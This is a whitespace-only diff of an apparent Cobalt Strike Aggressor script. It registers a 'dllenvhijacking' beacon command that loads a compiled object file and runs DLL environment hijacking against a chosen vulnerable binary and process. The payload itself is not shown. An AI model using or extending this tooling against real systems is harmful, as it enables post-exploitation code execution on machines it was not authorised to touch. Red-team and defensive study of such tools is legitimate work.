@@ -9,26 +9,25 @@ beacon_command_register(
 alias dllenvhijacking {
     $bid = $1;
     $sysroot = $2;
-	$proxydll = $3;
-	$pathtodll = $4;
-	$vulnbinary = $5;
-	$pid = $6;
+    $proxydll = $3;
+    $pathtodll = $4;
+    $vulnbinary = $5;
+    $pid = $6;
 
-	if ($sysroot eq "" || $proxydll eq "" || $pathtodll eq "" || $vulnbinary eq "" || $pid eq "") {
-		berror($bid, "Please make sure that all the arguments are filled in and correct!\n");
-		return;
-	}
-	
+    if ($sysroot eq "" || $proxydll eq "" || $pathtodll eq "" || $vulnbinary eq "" || $pid eq "") {
+        berror($bid, "Please make sure that all the arguments are filled in and correct!\n");
+        return;
+    }
+
     # Read in the right BOF file
     $handle = openf(script_resource("dllenvhijacking.o"));
     $data   = readb($handle, -1);
     closef($handle);
 
-	# Pack our arguments
+    # Pack our arguments
     $arg_data  = bof_pack($bid, "ZZZzi", $sysroot, $proxydll, $pathtodll, $vulnbinary, $pid);
-	
 
-	blog($bid, "Tasked execute DLL Environment hijacking..");
+    blog($bid, "Tasked execute DLL Environment hijacking..");
     beacon_inline_execute($bid, $data, "go", $arg_data);
 }
 
